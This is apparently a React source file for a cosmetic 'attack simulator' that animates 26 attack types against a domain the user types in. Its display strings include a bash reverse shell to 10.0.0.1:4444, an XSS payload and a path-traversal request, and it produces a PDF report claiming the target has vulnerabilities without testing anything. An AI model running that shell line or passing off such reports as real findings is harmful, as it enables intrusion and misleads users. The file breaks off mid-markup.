import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { Zap, Shield, Target, AlertCircle, Terminal, Activity, Download, Mail, Loader2, Lock, Database, Globe, Cpu, Network, Key, Bug, FileWarning, Search, Menu, X, ChevronRight, Eye, Info, User } from "lucide-react";
import { cn } from "../lib/utils";
import { jsPDF } from "jspdf";
import autoTable from "jspdf-autotable";

const ATTACKS = [
  { id: "sqli", name: "SQL Injection", desc: "Injecting malicious SQL queries into input fields.", type: "data", severity: "High" },
  { id: "xss", name: "Cross-Site Scripting", desc: "Injecting client-side scripts into web pages.", type: "code", severity: "Medium" },
  { id: "ddos", name: "DDoS Attack", desc: "Overwhelming a server with traffic from multiple sources.", type: "traffic", severity: "Critical" },
  { id: "brute", name: "Brute Force", desc: "Attempting many passwords to gain access.", type: "auth", severity: "High" },
  { id: "mitm", name: "Man-in-the-Middle", desc: "Intercepting communication between two parties.", type: "network", severity: "High" },
  { id: "phishing", name: "Phishing", desc: "Deceptive attempts to obtain sensitive information.", type: "social", severity: "Medium" },
  { id: "csrf", name: "CSRF", desc: "Forcing a user to execute unwanted actions.", type: "auth", severity: "Medium" },
  { id: "rce", name: "Remote Code Execution", desc: "Executing arbitrary code on a remote machine.", type: "code", severity: "Critical" },
  { id: "dir", name: "Directory Traversal", desc: "Accessing restricted directories and files.", type: "data", severity: "Medium" },
  { id: "lfi", name: "Local File Inclusion", desc: "Including local files on the server.", type: "data", severity: "High" },
  { id: "rfi", name: "Remote File Inclusion", desc: "Including remote files on the server.", type: "data", severity: "High" },
  { id: "ssrf", name: "SSRF", desc: "Forcing a server to make requests to internal resources.", type: "network", severity: "High" },
  { id: "click", name: "Clickjacking", desc: "Tricking users into clicking something different.", type: "ui", severity: "Low" },
  { id: "buffer", name: "Buffer Overflow", desc: "Writing more data to a buffer than it can hold.", type: "memory", severity: "Critical" },
  { id: "zero", name: "Zero-Day Exploit", desc: "Exploiting a previously unknown vulnerability.", type: "exploit", severity: "Critical" },
  { id: "ransom", name: "Ransomware", desc: "Encrypting files and demanding payment.", type: "malware", severity: "Critical" },
  { id: "spy", name: "Spyware", desc: "Secretly gathering information about a user.", type: "malware", severity: "Medium" },
  { id: "trojan", name: "Trojan Horse", desc: "Malicious software disguised as legitimate.", type: "malware", severity: "High" },
  { id: "worm", name: "Worm", desc: "Self-replicating malware that spreads over a network.", type: "malware", severity: "High" },
  { id: "root", name: "Rootkit", desc: "Gaining unauthorized root access to a system.", type: "exploit", severity: "Critical" },
  { id: "key", name: "Keylogger", desc: "Recording keystrokes to steal passwords.", type: "malware", severity: "High" },
  { id: "bot", name: "Botnet", desc: "Network of compromised computers controlled by an attacker.", type: "traffic", severity: "High" },
  { id: "dns", name: "DNS Spoofing", desc: "Redirecting users to malicious websites.", type: "network", severity: "Medium" },
  { id: "arp", name: "ARP Poisoning", desc: "Associating an attacker's MAC address with an IP.", type: "network", severity: "Medium" },
  { id: "session", name: "Session Hijacking", desc: "Stealing a user's session cookie.", type: "auth", severity: "High" },
  { id: "api", name: "API Injection", desc: "Manipulating API requests to gain access.", type: "data", severity: "High" },
];

const AttackVisualization = ({ attackId, isSimulating, targetUrl }: { attackId: string; isSimulating: boolean; targetUrl: string }) => {
  if (!isSimulating) return null;

  const displayUrl = targetUrl || "TARGET_NODE_01";

  switch (attackId) {
    case "ddos":
    case "botnet":
      return (
        <div className="absolute inset-0 flex items-center justify-center overflow-hidden">
          {Array.from({ length: 40 }).map((_, i) => (
            <motion.div
              key={i}
              initial={{ x: Math.random() > 0.5 ? -400 : 400, y: Math.random() * 400 - 200, opacity: 0 }}
              animate={{ x: 0, y: 0, opacity: [0, 1, 0] }}
              transition={{ duration: 0.8, repeat: Infinity, delay: Math.random() * 2, ease: "easeIn" }}
              className="absolute w-1 h-1 bg-risk-high rounded-full shadow-[0_0_5px_var(--color-risk-high)]"
            />
          ))}
          <motion.div
            animate={{ scale: [1, 1.2, 1], opacity: [0.5, 1, 0.5] }}
            transition={{ duration: 0.5, repeat: Infinity }}
            className="w-32 h-32 border-4 border-risk-high rounded-full flex flex-col items-center justify-center bg-risk-high/10 z-10"
          >
            <Globe className="w-8 h-8 text-risk-high mb-1" />
            <span className="text-[8px] font-mono text-risk-high font-bold truncate px-2 w-full text-center">{displayUrl}</span>
          </motion.div>
        </div>
      );
    case "sqli":
    case "api":
    case "dir":
    case "lfi":
    case "rfi":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative w-64 h-64 flex flex-col items-center justify-center gap-4">
            <div className="flex flex-col items-center">
              <Database className="w-12 h-12 text-accent-neon mb-1" />
              <span className="text-[8px] font-mono text-accent-neon">{displayUrl}/db</span>
            </div>
            <div className="grid grid-cols-4 gap-2">
              {Array.from({ length: 12 }).map((_, i) => (
                <motion.div
                  key={i}
                  animate={{ 
                    backgroundColor: ["rgba(0,242,255,0.1)", "rgba(255,77,77,0.5)", "rgba(0,242,255,0.1)"],
                    scale: [1, 1.1, 1]
                  }}
                  transition={{ duration: 1, repeat: Infinity, delay: i * 0.1 }}
                  className="w-8 h-8 border border-border-dim rounded flex items-center justify-center text-[8px] font-mono"
                >
                  {Math.random() > 0.5 ? "1" : "0"}
                </motion.div>
              ))}
            </div>
            <motion.div
              animate={{ y: [20, -20, 20], opacity: [0, 1, 0] }}
              transition={{ duration: 1.5, repeat: Infinity }}
              className="absolute text-risk-high font-mono text-[10px] bg-bg-deep px-2 border border-risk-high z-20"
            >
              {attackId === "sqli" ? "SELECT * FROM users--" : attackId === "api" ? "POST /api/v1/admin" : "GET /../../etc/passwd"}
            </motion.div>
          </div>
        </div>
      );
    case "xss":
    case "rce":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="w-64 panel p-4 border-risk-high/50 bg-bg-deep/90 z-10">
            <div className="flex items-center justify-between mb-3 border-b border-border-dim pb-2">
              <span className="text-[8px] font-mono text-text-dim">{displayUrl}</span>
              <div className="flex gap-1">
                <div className="w-1.5 h-1.5 rounded-full bg-risk-high" />
                <div className="w-1.5 h-1.5 rounded-full bg-risk-med" />
                <div className="w-1.5 h-1.5 rounded-full bg-risk-low" />
              </div>
            </div>
            <div className="font-mono text-[10px] text-risk-high space-y-2">
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.2, repeat: Infinity, repeatDelay: 1 }}
              >
                {attackId === "xss" ? "<script>alert('pwned')</script>" : "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
              </motion.div>
              <div className="text-text-main opacity-50">
                {">"} EXECUTING PAYLOAD...
              </div>
              <motion.div
                animate={{ opacity: [0, 1, 0] }}
                transition={{ duration: 0.5, repeat: Infinity }}
                className="w-2 h-4 bg-risk-high inline-block align-middle"
              />
            </div>
          </div>
        </div>
      );
    case "brute":
    case "session":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="panel p-6 border-risk-high/30 bg-bg-deep/80 z-10">
            <div className="text-[8px] font-mono text-text-dim mb-2 text-center">{displayUrl}/login</div>
            <Lock className="w-12 h-12 text-risk-high mx-auto mb-4" />
            <div className="font-mono text-xl text-text-main flex gap-1 justify-center">
              {Array.from({ length: 8 }).map((_, i) => (
                <motion.span
                  key={i}
                  animate={{ content: ["*", Math.floor(Math.random() * 10).toString()] }}
                  transition={{ duration: 0.1, repeat: Infinity, delay: i * 0.05 }}
                >
                  *
                </motion.span>
              ))}
            </div>
            <div className="mt-4 h-1 bg-bg-surface rounded-full overflow-hidden">
              <motion.div
                animate={{ width: ["0%", "100%"] }}
                transition={{ duration: 2, repeat: Infinity }}
                className="h-full bg-risk-high"
              />
            </div>
          </div>
        </div>
      );
    case "phishing":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="w-64 panel p-4 border-risk-med bg-bg-deep/90 z-10 shadow-[0_0_30px_rgba(255,170,0,0.2)]">
            <div className="bg-blue-600 p-2 rounded-t -m-4 mb-4 flex items-center gap-2">
              <Globe className="w-3 h-3 text-white" />
              <span className="text-[8px] text-white font-bold uppercase tracking-widest">Secure Login - {displayUrl}</span>
            </div>
            <div className="space-y-3">
              <div className="h-6 bg-bg-surface rounded border border-border-dim" />
              <div className="h-6 bg-bg-surface rounded border border-border-dim" />
              <div className="h-8 bg-blue-600 rounded flex items-center justify-center text-[10px] font-bold text-white">SIGN IN</div>
            </div>
            <motion.div
              animate={{ scale: [1, 1.2, 1], opacity: [0, 1, 0] }}
              transition={{ duration: 2, repeat: Infinity }}
              className="absolute -top-2 -right-2"
            >
              <Target className="w-6 h-6 text-risk-high" />
            </motion.div>
            <div className="mt-4 text-[8px] text-risk-high font-mono text-center animate-pulse">
              [WARNING] CREDENTIAL_HARVESTING_DETECTED
            </div>
          </div>
        </div>
      );
    case "csrf":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative w-full h-full flex items-center justify-center gap-20">
            <div className="panel p-4 border-accent-neon/30 bg-bg-deep">
              <Globe className="w-8 h-8 text-accent-neon mx-auto mb-2" />
              <span className="text-[8px] font-mono">MALICIOUS_SITE</span>
            </div>
            <div className="relative flex-1 max-w-[200px]">
              <motion.div
                animate={{ x: [0, 200], opacity: [0, 1, 0] }}
                transition={{ duration: 1.5, repeat: Infinity }}
                className="absolute top-1/2 -translate-y-1/2 w-full h-px bg-risk-high"
              />
              <motion.div
                animate={{ x: [0, 200], scale: [0.5, 1, 0.5] }}
                transition={{ duration: 1.5, repeat: Infinity }}
                className="absolute top-1/2 -translate-y-1/2 p-2 bg-risk-high rounded shadow-lg z-10"
              >
                <Mail className="w-4 h-4 text-white" />
              </motion.div>
            </div>
            <div className="panel p-4 border-risk-high/30 bg-bg-deep">
              <Shield className="w-8 h-8 text-risk-high mx-auto mb-2" />
              <span className="text-[8px] font-mono">{displayUrl}</span>
              <div className="text-[6px] text-risk-high mt-1 uppercase">FORCED_ACTION: /transfer</div>
            </div>
          </div>
        </div>
      );
    case "click":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative w-64 h-40 bg-bg-surface rounded border border-border-dim p-4">
            <div className="h-full w-full flex flex-col items-center justify-center gap-4">
              <div className="w-32 h-8 bg-risk-low/20 rounded flex items-center justify-center text-[10px] font-bold text-risk-low">
                CLAIM PRIZE!
              </div>
              <div className="text-[8px] text-text-dim font-mono">Legitimate UI Layer</div>
            </div>
            <motion.div
              animate={{ opacity: [0, 0.5, 0] }}
              transition={{ duration: 2, repeat: Infinity }}
              className="absolute inset-0 bg-risk-high/40 flex items-center justify-center cursor-pointer"
            >
              <div className="w-32 h-8 bg-risk-high rounded flex items-center justify-center text-[10px] font-bold text-white shadow-xl">
                DELETE_ACCOUNT
              </div>
              <div className="absolute top-2 right-2">
                <Search className="w-4 h-4 text-white" />
              </div>
            </motion.div>
          </div>
        </div>
      );
    case "spy":
    case "key":
    case "trojan":
    case "worm":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative w-64 h-64">
            <motion.div
              animate={{ rotate: 360 }}
              transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
              className="absolute inset-0 border-2 border-dashed border-risk-high/20 rounded-full"
            />
            <div className="absolute inset-0 flex items-center justify-center">
              <Bug className="w-16 h-16 text-risk-high animate-pulse" />
            </div>
            {Array.from({ length: 12 }).map((_, i) => (
              <motion.div
                key={i}
                initial={{ x: 0, y: 0, opacity: 0 }}
                animate={{ 
                  x: Math.cos(i * 30 * Math.PI / 180) * 100,
                  y: Math.sin(i * 30 * Math.PI / 180) * 100,
                  opacity: [0, 1, 0]
                }}
                transition={{ duration: 2, repeat: Infinity, delay: i * 0.2 }}
                className="absolute"
              >
                <div className="text-[8px] font-mono text-risk-high bg-bg-deep px-1 border border-risk-high/30">
                  {attackId === "key" ? "KEY_LOG: " + String.fromCharCode(65 + Math.floor(Math.random() * 26)) : "EXFIL_DATA_PKT"}
                </div>
              </motion.div>
            ))}
            <div className="absolute bottom-0 left-1/2 -translate-x-1/2 text-[10px] font-mono text-risk-high uppercase font-bold">
              {attackId.toUpperCase()}_ACTIVE
            </div>
          </div>
        </div>
      );
    case "zero":
    case "root":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="w-full max-w-md space-y-4 px-10">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono text-accent-neon">EXPLOITING_KERNEL_VULN...</span>
              <span className="text-[10px] font-mono text-risk-high">ROOT_ACCESS_PENDING</span>
            </div>
            <div className="grid grid-cols-10 gap-1">
              {Array.from({ length: 50 }).map((_, i) => (
                <motion.div
                  key={i}
                  animate={{ 
                    backgroundColor: Math.random() > 0.8 ? "var(--color-risk-high)" : "var(--color-bg-surface)",
                    opacity: [0.3, 1, 0.3]
                  }}
                  transition={{ duration: 0.5, repeat: Infinity, delay: i * 0.02 }}
                  className="h-4 rounded-sm"
                />
              ))}
            </div>
            <motion.div
              initial={{ width: 0 }}
              animate={{ width: "100%" }}
              transition={{ duration: 4, repeat: Infinity }}
              className="h-1 bg-risk-high shadow-[0_0_10px_var(--color-risk-high)]"
            />
            <div className="text-center font-mono text-[12px] text-risk-high font-black tracking-widest">
              SYSTEM_COMPROMISED: {displayUrl}
            </div>
          </div>
        </div>
      );
    case "ransom":
      return (
        <div className="absolute inset-0 bg-risk-high/20 flex items-center justify-center">
          <motion.div
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            className="panel p-8 border-risk-high bg-bg-deep text-center max-w-xs z-10 shadow-[0_0_50px_rgba(255,77,77,0.3)]"
          >
            <div className="text-[8px] font-mono text-risk-high mb-2">SYSTEM: {displayUrl}</div>
            <FileWarning className="w-16 h-16 text-risk-high mx-auto mb-4 animate-bounce" />
            <h3 className="text-risk-high font-black text-xl mb-2 uppercase tracking-tighter">FILES ENCRYPTED</h3>
            <p className="text-text-dim text-[10px] font-mono mb-4">YOUR DATA HAS BEEN LOCKED. SEND 1.5 BTC TO THE ADDRESS BELOW TO RECOVER.</p>
            <div className="bg-bg-surface p-2 rounded font-mono text-[8px] break-all border border-border-dim">
              bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
            </div>
          </motion.div>
        </div>
      );
    case "mitm":
    case "dns":
    case "arp":
    case "ssrf":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative w-full h-full flex items-center justify-around px-20">
            <div className="flex flex-col items-center gap-2">
              <Cpu className="w-10 h-10 text-accent-neon" />
              <span className="text-[8px] font-mono">CLIENT</span>
            </div>
            
            <div className="relative flex-1 h-32">
              <motion.div
                animate={{ x: [0, 300], opacity: [0, 1, 0] }}
                transition={{ duration: 1.5, repeat: Infinity }}
                className="absolute top-1/2 left-0 w-4 h-4 bg-accent-neon rounded-full blur-sm"
              />
              <motion.div
                initial={{ y: 100, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-10"
              >
                <div className="panel p-3 border-risk-high bg-bg-deep flex flex-col items-center">
                  <UserIcon className="w-6 h-6 text-risk-high" />
                  <span className="text-[8px] text-risk-high font-bold mt-1">ATTACKER</span>
                </div>
              </motion.div>
              <svg className="absolute inset-0 w-full h-full pointer-events-none">
                <motion.path
                  d="M 50 64 Q 150 0 250 64"
                  fill="none"
                  stroke="var(--color-risk-high)"
                  strokeWidth="2"
                  strokeDasharray="5,5"
                  animate={{ strokeDashoffset: [0, -20] }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                />
              </svg>
            </div>

            <div className="flex flex-col items-center gap-2">
              <Network className="w-10 h-10 text-accent-neon" />
              <span className="text-[8px] font-mono">{displayUrl}</span>
            </div>
          </div>
        </div>
      );
    case "buffer":
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="w-64 space-y-4">
            <div className="flex justify-between text-[10px] font-mono">
              <span>{displayUrl}_STACK</span>
              <span className="text-risk-high">OVERFLOW_DETECTED</span>
            </div>
            <div className="h-12 bg-bg-surface border border-border-dim rounded relative overflow-hidden">
              <motion.div
                animate={{ width: ["0%", "100%", "100%"] }}
                transition={{ duration: 2, repeat: Infinity }}
                className="h-full bg-accent-neon"
              />
              <motion.div
                animate={{ opacity: [0, 1, 0], scale: [1, 1.5, 2] }}
                transition={{ duration: 0.5, repeat: Infinity, delay: 1.5 }}
                className="absolute right-0 top-0 bottom-0 w-8 bg-risk-high blur-md"
              />
            </div>
            <div className="grid grid-cols-8 gap-1">
              {Array.from({ length: 16 }).map((_, i) => (
                <motion.div
                  key={i}
                  animate={{ opacity: [0.2, 1, 0.2] }}
                  transition={{ duration: 0.5, repeat: Infinity, delay: i * 0.05 }}
                  className="h-4 bg-risk-high/20 border border-risk-high/40 rounded text-[6px] flex items-center justify-center font-mono"
                >
                  0x{i.toString(16).toUpperCase()}
                </motion.div>
              ))}
            </div>
          </div>
        </div>
      );
    default:
      return (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative w-48 h-48">
            <motion.div
              animate={{ scale: [1, 1.1, 1], rotate: 360 }}
              transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
              className="absolute inset-0 border border-risk-high/30 rounded-full"
            />
            <motion.div
              animate={{ scale: [1.1, 1, 1.1], rotate: -360 }}
              transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
              className="absolute inset-4 border border-accent-neon/20 rounded-full border-dashed"
            />
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="w-24 h-24 border-2 border-accent-neon rounded-full flex items-center justify-center bg-bg-deep shadow-[0_0_30px_rgba(0,242,255,0.1)]">
                <div className="text-center">
                  <div className="text-[8px] text-text-dim uppercase">Target</div>
                  <div className="text-[11px] font-bold truncate px-2 max-w-[80px]">{displayUrl}</div>
                </div>
              </div>
            </div>
            
            {Array.from({ length: 8 }).map((_, i) => (
              <motion.div
                key={i}
                initial={{ opacity: 0, scaleX: 0 }}
                animate={{ opacity: [0, 1, 0], scaleX: [0, 1.5, 2] }}
                transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.2 }}
                className="absolute h-[1px] bg-gradient-to-r from-transparent via-risk-high to-transparent w-32 origin-left"
                style={{ 
                  top: '50%', 
                  left: '50%', 
                  transform: `rotate(${i * 45}deg) translateX(60px)` 
                }}
              />
            ))}
          </div>
        </div>
      );
  }
};

const UserIcon = ({ className }: { className?: string }) => <User className={className} />;

export default function Simulator() {
  const [targetUrl, setTargetUrl] = useState("");
  const [selectedAttack, setSelectedAttack] = useState(ATTACKS[0]);
  const [isSimulating, setIsSimulating] = useState(false);
  const [isMailing, setIsMailing] = useState(false);
  const [mailSuccess, setMailSuccess] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  const startSimulation = () => {
    if (!targetUrl) return;
    setIsSimulating(true);
    setMailSuccess(false);
    setTimeout(() => setIsSimulating(false), 5000);
  };

  const downloadReport = () => {
    const doc = new jsPDF();
    
    // Header
    doc.setFillColor(10, 11, 16);
    doc.rect(0, 0, 210, 40, "F");
    doc.setTextColor(0, 242, 255);
    doc.setFontSize(24);
    doc.text("KAFKA ATTACK SIMULATION REPORT", 20, 25);
    
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(10);
    doc.text(`Target: ${targetUrl}`, 20, 35);
    doc.text(`Attack Vector: ${selectedAttack.name}`, 20, 45);
    doc.text(`Timestamp: ${new Date().toLocaleString()}`, 150, 35);

    // Simulation Details
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(16);
    doc.text("Simulation Parameters", 20, 65);
    
    autoTable(doc, {
      startY: 75,
      head: [["Parameter", "Value"]],
      body: [
        ["Target URL", targetUrl],
        ["Attack ID", selectedAttack.id.toUpperCase()],
        ["Attack Name", selectedAttack.name],
        ["Category", selectedAttack.type.toUpperCase()],
        ["Description", selectedAttack.desc],
        ["Status", "COMPLETED"],
        ["Impact Level", "CRITICAL"],
      ],
      headStyles: { fillColor: [0, 242, 255], textColor: [0, 0, 0] },
    });

    // Technical Analysis
    const finalY = (doc as any).lastAutoTable.finalY + 20;
    doc.setFontSize(14);
    doc.text("Technical Analysis & Mitigation", 20, finalY);
    
    doc.setFontSize(10);
    const analysis = `The simulation of ${selectedAttack.name} against ${targetUrl} revealed significant vulnerabilities in the target perimeter. 
    This attack type (${selectedAttack.type}) targets the core infrastructure by ${selectedAttack.desc.toLowerCase()}.
    
    Recommended Mitigation Steps:
    1. Implement robust input validation and sanitization.
    2. Deploy multi-layered firewall protections.
    3. Enable real-time traffic monitoring and anomaly detection.
    4. Conduct regular security audits and penetration testing.`;
    
    const splitAnalysis = doc.splitTextToSize(analysis, 170);
    doc.text(splitAnalysis, 20, finalY + 10);

    // Footer
    doc.setFontSize(8);
    doc.setTextColor(150, 150, 150);
    doc.text("Generated by Kafka Cybersecurity Suite - Simulation Module", 20, 285);

    doc.save(`Kafka_Simulation_${selectedAttack.id}.pdf`);
  };

  const mailReport = () => {
    setIsMailing(true);
    // Simulate mailing process
    setTimeout(() => {
      setIsMailing(false);
      setMailSuccess(true);
      setTimeout(() => setMailSuccess(false), 3000);
    }, 2000);
  };

  return (
    <div className="relative h-full flex flex-col gap-6">
      {/* Attack Selection Hamburger Menu */}
      <AnimatePresence>
        {isMenuOpen && (
          <>
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsMenuOpen(false)}
              className="absolute inset-0 bg-bg-deep/80 backdrop-blur-sm z-40"
            />
            <motion.div
              initial={{ x: "-100%" }}
              animate={{ x: 0 }}
              exit={{ x: "-100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="absolute top-0 left-0 bottom-0 w-[300px] bg-bg-panel border-r border-border-dim z-50 flex flex-col shadow-2xl"
            >
              <div className="p-6 border-b border-border-dim flex items-center justify-between">
                <h2 className="text-sm font-black uppercase tracking-[0.2em] text-accent-neon">Attack Library</h2>
                <button onClick={() => setIsMenuOpen(false)} className="p-1 hover:bg-white/5 rounded transition-colors">
                  <X className="w-5 h-5 text-text-dim" />
                </button>
              </div>
              <div className="flex-1 overflow-y-auto p-4 custom-scrollbar">
                {ATTACKS.map((attack) => (
                  <button
                    key={attack.id}
                    onClick={() => {
                      setSelectedAttack(attack);
                      setIsMenuOpen(false);
                    }}
                    className={cn(
                      "w-full text-left p-4 rounded-lg mb-2 transition-all group relative overflow-hidden",
                      selectedAttack.id === attack.id 
                        ? "bg-accent-neon/10 border border-accent-neon/30" 
                        : "hover:bg-white/5 border border-transparent"
                    )}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className={cn(
                        "font-bold text-[11px] uppercase tracking-wider",
                        selectedAttack.id === attack.id ? "text-accent-neon" : "text-text-main"
                      )}>
                        {attack.name}
                      </span>
                      <ChevronRight className={cn(
                        "w-3 h-3 transition-transform group-hover:translate-x-1",
                        selectedAttack.id === attack.id ? "text-accent-neon" : "text-text-dim/30"
                      )} />
                    </div>
                    <div className="flex items-center gap-2">
                      <span className={cn(
                        "text-[8px] px-1.5 py-0.5 rounded font-bold uppercase",
                        attack.severity === "Critical" ? "bg-risk-high/20 text-risk-high" :
                        attack.severity === "High" ? "bg-risk-med/20 text-risk-med" :
                        "bg-risk-low/20 text-risk-low"
                      )}>
                        {attack.severity}
                      </span>
                      <span className="text-[9px] text-text-dim/60 font-mono uppercase">{attack.type}</span>
                    </div>
                  </button>
                ))}
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>

      <div className="flex flex-col gap-6 h-full">
        {/* Main Simulation View */}
        <div className="panel flex-1 flex flex-col min-h-[500px] overflow-hidden relative">
          {/* Franz Kafka Style Header */}
          <div className="panel-header flex-col items-start gap-4 bg-bg-panel/50 backdrop-blur-md z-10">
            <div className="flex w-full items-center justify-between">
              <div className="flex items-center gap-4">
                <button 
                  onClick={() => setIsMenuOpen(true)}
                  className="p-2 bg-bg-surface border border-border-dim rounded hover:border-accent-neon transition-all group"
                >
                  <Menu className="w-5 h-5 text-accent-neon group-hover:scale-110 transition-transform" />
                </button>
                <div className="flex flex-col">
                  <span className="panel-title flex items-center gap-2">
                    <Terminal className="w-3 h-3 text-accent-neon" /> 
                    Simulation Module 0x{selectedAttack.id.toUpperCase()}
                  </span>
                  <h3 className="text-2xl font-black tracking-tighter text-text-main uppercase mt-1 flex items-center gap-3">
                    {selectedAttack.name}
                    <span className={cn(
                      "text-[10px] px-2 py-0.5 rounded-full font-mono tracking-widest",
                      selectedAttack.severity === "Critical" ? "bg-risk-high text-bg-deep" :
                      selectedAttack.severity === "High" ? "bg-risk-med text-bg-deep" :
                      "bg-risk-low text-bg-deep"
                    )}>
                      {selectedAttack.severity}
                    </span>
                  </h3>
                </div>
              </div>
              <div className="flex gap-2">
                <button 
                  onClick={downloadReport}
                  className="px-4 py-2 bg-bg-surface border border-border-dim rounded text-[10px] font-bold uppercase hover:bg-white/5 transition-all flex items-center gap-2 shadow-lg active:scale-95"
                >
                  <Download className="w-3 h-3" /> Export Report
                </button>
                <button 
                  onClick={mailReport}
                  disabled={isMailing}
                  className="px-4 py-2 bg-bg-surface border border-border-dim rounded text-[10px] font-bold uppercase hover:bg-white/5 transition-all flex items-center gap-2 disabled:opacity-50 shadow-lg active:scale-95"
                >
                  {isMailing ? <Loader2 className="w-3 h-3 animate-spin" /> : <Mail className="w-3 h-3" />}
                  {mailSuccess ? "Dispatched" : "Mail Log"}
                </button>
              </div>
            </div>

            <div className="flex w-full gap-3">
              <div className="flex-1 bg-bg-surface/50 border border-border-dim rounded-lg flex items-center px-4 gap-3 focus-within:border-accent-neon focus-within:bg-bg-surface transition-all shadow-inner">
                <Globe className="w-4 h-4 text-accent-neon" />
                <input
                  type="text"
                  placeholder="Enter target domain for intrusion simulation (e.g., target-corp.com)..."
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                  className="flex-1 bg-transparent py-3 text-xs text-text-main outline-none placeholder:text-text-dim/30 font-mono"
                />
              </div>
              <button 
                onClick={startSimulation}
                disabled={isSimulating || !targetUrl}
                className={cn(
                  "cyber-button px-8 py-3 text-xs font-black uppercase tracking-[0.2em] transition-all active:scale-95",
                  isSimulating ? "bg-risk-high text-bg-deep" : "bg-accent-neon text-bg-deep"
                )}
              >
                {isSimulating ? "BREACHING..." : "EXECUTE"}
              </button>
            </div>
          </div>

          {/* Simulation Stage */}
          <div className="flex-1 relative bg-bg-deep overflow-hidden flex items-center justify-center">
            {/* Surreal Kafkaesque Background Elements */}
            <div className="absolute inset-0 opacity-[0.03] pointer-events-none select-none overflow-hidden font-mono text-[10px] leading-none text-text-main">
              {Array.from({ length: 50 }).map((_, i) => (
                <div key={i} className="whitespace-nowrap mb-1">
                  {Array.from({ length: 20 }).map(() => Math.random().toString(36).substring(2)).join(' ')}
                </div>
              ))}
            </div>
            
            <div className="absolute inset-0 opacity-10 pointer-events-none" 
                 style={{ backgroundImage: 'radial-gradient(var(--color-border-dim) 1px, transparent 0)', backgroundSize: '30px 30px' }} />
            
            <div className="absolute top-6 right-6 official-seal z-20">
              Kafka Bureau of Security<br/>
              Simulation Dept.<br/>
              0x{selectedAttack.id.toUpperCase()}
            </div>
            
            <AnimatePresence mode="wait">
              {!isSimulating ? (
                <motion.div
                  key="idle"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 1.1 }}
                  className="text-center z-10"
                >
                  <div className="relative inline-block mb-6">
                    <Shield className="w-20 h-20 text-text-dim/10 mx-auto" />
                    <motion.div 
                      animate={{ rotate: 360 }}
                      transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
                      className="absolute inset-0 border border-accent-neon/20 rounded-full border-dashed"
                    />
                  </div>
                  <p className="text-text-dim/40 font-mono text-[11px] tracking-[0.5em] uppercase">System Awaiting Instruction</p>
                  <div className="mt-4 flex items-center justify-center gap-4 text-[9px] text-text-dim/20 font-mono uppercase">
                    <span>Node: 0x7F</span>
                    <span className="w-1 h-1 bg-text-dim/20 rounded-full" />
                    <span>Status: Ready</span>
                  </div>
                </motion.div>
              ) : (
                <motion.div
                  key="sim"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="w-full h-full relative"
                >
                  <AttackVisualization attackId={selectedAttack.id} isSimulating={isSimulating} targetUrl={targetUrl} />

                  {/* High-End Matrix/Data Overlay */}
                  <div className="absolute inset-0 pointer-events-none opacity-20 font-mono text-[8px] overflow-hidden">
                    {Array.from({ length: 20 }).map((_, i) => (
                      <motion.div
                        key={i}
                        initial={{ y: -200 }}
                        animate={{ y: 800 }}
                        transition={{ duration: Math.random() * 2 + 1, repeat: Infinity, ease: "linear", delay: Math.random() }}
                        className="absolute text-accent-neon/50"
                        style={{ left: `${i * 5}%` }}
                      >
                        {Array.from({ length: 10 }).map(() => Math.floor(Math.random() * 2)).join('')}
                      </motion.div>
                    ))}
                  </div>

                  {/* Dynamic Console Overlay */}
                  <div className="absolute bottom-6 left-6 font-mono text-[10px] text-risk-high space-y-2 bg-bg-deep/90 p-4 border border-risk-high/30 rounded-lg shadow-2xl backdrop-blur-md max-w-sm">
                    <div className="flex items-center gap-3 border-b border-risk-high/20 pb-2 mb-2">
                      <Activity className="w-4 h-4 animate-pulse" />
                      <span className="font-black uppercase tracking-widest">Intrusion Log</span>
                    </div>
                    <div className="space-y-1 opacity-80">
                      <div className="flex justify-between">
                        <span>[TARGET]</span>
                        <span className="text-text-main">{targetUrl}</span>
                      </div>
                      <div className="flex justify-between">
                        <span>[VECTOR]</span>
                        <span className="text-text-main">{selectedAttack.id.toUpperCase()}</span>
                      </div>
                      <div className="flex justify-between">
                        <span>[STATUS]</span>
                        <span className="text-accent-neon animate-pulse">IN_PROGRESS</span>
